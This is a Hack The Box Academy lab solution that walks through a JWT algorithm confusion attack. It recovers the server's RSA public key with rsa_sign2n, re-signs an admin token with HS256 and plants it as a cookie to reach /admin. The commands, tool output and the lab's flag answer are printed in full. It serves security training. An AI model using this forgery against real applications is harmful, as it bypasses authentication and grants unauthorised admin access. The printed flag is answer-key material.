The web application is misconfigured to accept JWTs signed with the symmetric `HS256` algorithm using the public key as the signing secret. Therefore, students need to perform an algorithm confusion attack.

To attain the public key used by the web application for signature verification, students first need to ensure that the Docker service is started:

Code: shell

```shell
sudo systemctl start docker
```

```
┌─[us-academy-1]─[10.10.14.233]─[htb-ac-413848@htb-blteicowpb]─[~]
└──╼ [★]$ sudo systemctl start docker
```

Thereafter, students need to download [rsa\_sign2n](https://github.com/silentsignal/rsa_sign2n) and build its Docker container:

Code: shell

```shell
git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
sudo docker build . -t sig2n
```

```
┌─[us-academy-1]─[10.10.14.233]─[htb-ac-413848@htb-blteicowpb]─[~]
└──╼ [★]$ git clone https://github.com/silentsignal/rsa_sign2n
cd rsa_sign2n/standalone/
sudo docker build . -t sig2n

Cloning into 'rsa_sign2n'...
remote: Enumerating objects: 117, done.
remote: Counting objects: 100% (117/117), done.
remote: Compressing objects: 100% (81/81), done.
remote: Total 117 (delta 50), reused 94 (delta 30), pack-reused 0
Receiving objects: 100% (117/117), 39.19 KiB | 5.60 MiB/s, done.
Resolving deltas: 100% (50/50), done.
[+] Building 28.2s (11/11) FINISHED docker:default
 => [internal] load build definition from Dockerfile 0.0s
<SNIP>
```

Students then need to run the `sig2n` Docker container, interacting with it using the `bash` shell:

```shell
sudo docker run -it sig2n /bin/bash
```
```
┌─[us-academy-1]─[10.10.14.233]─[htb-ac-413848@htb-blteicowpb]─[~/rsa_sign2n/standalone]
└──╼ [★]$ sudo docker run -it sig2n /bin/bash

root@dda6af4efc3b:/app#
```

Afterward, students need to run `jwt_forgery.py` and provide it with at least two JWTs from the web application (students can sign in and out multiple times). Students will attain the public key in the `*_509.pem` file:

```shell
python3.8 jwt_forgery.py eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6IjE5ZXFOcmRvcGhJMVB5SWVNZFJzSlVFV2prUUs5RkpSQkQ2Y01zQ214RXdSNXhscGdLdHpyYkhYcXJUOFV5VmluWVM5V3V3Vm5rT0I3azhsS0t4YkhqRTJGVnd4R1dwNnFiVXhBY1VYLVBqZTZHR1VlWjRaaTlfWTBEZUgtZ3FXWTFVUnYyWmxsYUt4aE5NWjUxdmFLdDNHd25HMnZ2UGhLOWYzbVpTNWc4SkFNMjIyQ2FtSjBkdkVCUy1xNmVXTkdwcG5IU0tLUjhQWElEdXRncFJpaGYxU0RRMGlIVUVYOWRVNVVvZjVZOEZ1ZnJSWjk4WFlkZ2F2amtYT2dvSUxNMnpPXzMzdE5Hck5QVU9ZR2NpODJCdnJKaWUxdzVMNVVrbE0yX3FXc1hHQkVHbTVoNHlHazNheFMtMllia1pVc0dkQUxkbHR4NmhCbXdSU0pIRENxUSJ9LCJ0eXAiOiJKV1QifQ.<SNIP> eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6IjE5ZXFOcmRvcGhJMVB5SWVNZFJzSlVFV2prUUs5RkpSQkQ2Y01zQ214RXdSNXhscGdLdHpyYkhYcXJUOFV5VmluWVM5V3V3Vm5rT0I3azhsS0t4YkhqRTJGVnd4R1dwNnFiVXhBY1VYLVBqZTZHR1VlWjRaaTlfWTBEZUgtZ3FXWTFVUnYyWmxsYUt4aE5NWjUxdmFLdDNHd25HMnZ2UGhLOWYzbVpTNWc4SkFNMjIyQ2FtSjBkdkVCUy1xNmVXTkdwcG5IU0tLUjhQWElEdXRncFJpaGYxU0RRMGlIVUVYOWRVNVVvZjVZOEZ1ZnJSWjk4WFlkZ2F2amtYT2dvSUxNMnpPXzMzdE5Hck5QVU9ZR2NpODJCdnJKaWUxdzVMNVVrbE0yX3FXc1hHQkVHbTVoNHlHazNheFMtMllia1pVc0dkQUxkbHR4NmhCbXdSU0pIRENxUSJ9LCJ0eXAiOiJKV1QifQ.<SNIP>
```
```
root@dda6af4efc3b:/app# python3.8 jwt_forgery.py eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6IjE5ZXFOcmRvcGhJMVB5SWVNZFJzSlVFV2prUUs5RkpSQkQ2Y01zQ214RXdSNXhscGdLdHpyYkhYcXJUOFV5VmluWVM5V3V3Vm5rT0I3azhsS0t4YkhqRTJGVnd4R1dwNnFiVXhBY1VYLVBqZTZHR1VlWjRaaTlfWTBEZUgtZ3FXWTFVUnYyWmxsYUt4aE5NWjUxdmFLdDNHd25HMnZ2UGhLOWYzbVpTNWc4SkFNMjIyQ2FtSjBkdkVCUy1xNmVXTkdwcG5IU0tLUjhQWElEdXRncFJpaGYxU0RRMGlIVUVYOWRVNVVvZjVZOEZ1ZnJSWjk4WFlkZ2F2amtYT2dvSUxNMnpPXzMzdE5Hck5QVU9ZR2NpODJCdnJKaWUxdzVMNVVrbE0yX3FXc1hHQkVHbTVoNHlHazNheFMtMllia1pVc0dkQUxkbHR4NmhCbXdSU0pIRENxUSJ9LCJ0eXAiOiJKV1QifQ.<SNIP> eyJhbGciOiJSUzI1NiIsImp3ayI6eyJhbGciOiJSUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6IjE5ZXFOcmRvcGhJMVB5SWVNZFJzSlVFV2prUUs5RkpSQkQ2Y01zQ214RXdSNXhscGdLdHpyYkhYcXJUOFV5VmluWVM5V3V3Vm5rT0I3azhsS0t4YkhqRTJGVnd4R1dwNnFiVXhBY1VYLVBqZTZHR1VlWjRaaTlfWTBEZUgtZ3FXWTFVUnYyWmxsYUt4aE5NWjUxdmFLdDNHd25HMnZ2UGhLOWYzbVpTNWc4SkFNMjIyQ2FtSjBkdkVCUy1xNmVXTkdwcG5IU0tLUjhQWElEdXRncFJpaGYxU0RRMGlIVUVYOWRVNVVvZjVZOEZ1ZnJSWjk4WFlkZ2F2amtYT2dvSUxNMnpPXzMzdE5Hck5QVU9ZR2NpODJCdnJKaWUxdzVMNVVrbE0yX3FXc1hHQkVHbTVoNHlHazNheFMtMllia1pVc0dkQUxkbHR4NmhCbXdSU0pIRENxUSJ9LCJ0eXAiOiJKV1QifQ<SNIP>

[*] GCD: 0x1
[*] GCD: 0xd7d7aa36b768a612353f221e31d46c2541168e440af45251043e9c32c0a6c44c11e7196980ab73adb1d7aab4fc5325629<SNIP>
[+] Found n with multiplier 1 :
 0xd7d7aa36b768a612353f221e31d46c2541168e440af45251043e9c32c0a6c44c11e7196980ab73adb1d7aab4fc5325629<SNIP>
[+] Written to d7d7aa36b768a612_65537_x509.pem
[+] Tampered JWT: b'eyJhbGciOiJIUzI1NiIsImp3ayI6eyJhbGciOiJIUzI1NiIsImUiOiJBUUFCIiwia3R5IjoiUlNBIiwibiI6IjE5ZXFOcmRvcGhJMVB5SWVNZFJzSlVFV2prUUs5RkpSQkQ2Y01zQ214RXdSNXhscGdLdHpyYkhYcXJUOFV5VmluWVM5V3V3Vm5rT0I3azhsS0t4YkhqRTJGVnd4R1dwNnFiVXhBY1VYLVBqZTZHR1VlWjRaaTlfWTBEZUgtZ3FXWTFVUnYyWmxsYUt4aE5NWjUxdmFLdDNHd25HMnZ2UGhLOWYzbVpTNWc4SkFNMjIyQ2FtSjBkdkVCUy1xNmVXTkdwcG5IU0tLUjhQWElEdXRncFJpaGYxU0RRMGlIVUVYOWRVNVVvZjVZOEZ1ZnJSWjk4WFlkZ2F2amtYT2dvSUxNMnpPXzMzdE5Hck5QVU9ZR2NpODJCdnJKaWUxdzVMNVVrbE0yX3FXc1hHQkVHbTVoNHlHazNheFMtMllia1pVc0dkQUxkbHR4NmhCbXdSU0pIRENxUSJ9LCJ0eXAiOiJKV1QifQ.<SNIP>'
<SNIP>
```

Using [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Sign\('','HS256'\)), students then need to set the 'accountType' claim to 'admin' and sign the alerted JWT with the `HS256` algorithm, using the public key as the signing secret (appending a new line to it is necessary):

![[HTB Solutions/CWEE/z. images/91b6caa5d17f177008e094fae05ea234_MD5.jpg]]

After that, students need to add a new cookie to the browser's cookie jar named 'session', with its value being the altered JWT:

![[HTB Solutions/CWEE/z. images/5ede4f98fe354bb5f9db61b749b00eab_MD5.jpg]]

At last, when visiting the `/admin` page, students will attain the flag `HTB{b9bb6a3738e870e1ac0000e90c2bb022}`:

![[HTB Solutions/CWEE/z. images/976646bce667f86c14cdc58ae51a0c65_MD5.jpg]]

Answer: `HTB{b9bb6a3738e870e1ac0000e90c2bb022}`